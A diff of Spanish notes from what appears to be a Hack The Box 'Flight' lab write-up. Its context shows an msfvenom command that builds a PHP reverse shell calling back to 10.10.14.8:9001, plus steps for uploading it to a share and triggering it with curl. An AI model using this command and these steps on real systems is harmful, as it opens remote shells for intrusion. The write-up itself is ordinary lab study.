@@ -160,7 +160,7 @@ msfvenom -p php/reverse_php LHOST=10.10.14.8 LPORT=9001 -f raw > rawr.php
 
 después de crear la reverse shell la subimos al recurso compartido y ya solo debemos llamarlo desde la web o incluso haciendo un curl a la dirección `http://school.flight.htb/rawr.php` 
 
-#Nota todo esto ha funcionado pero de
+#Nota debido a que esta shell no es totalmente interactiva y se pierde la conexión nada cierto tiempo vamos a realizar otro enfoque
 ![[Pasted image 20240810142207.png]]
 
 
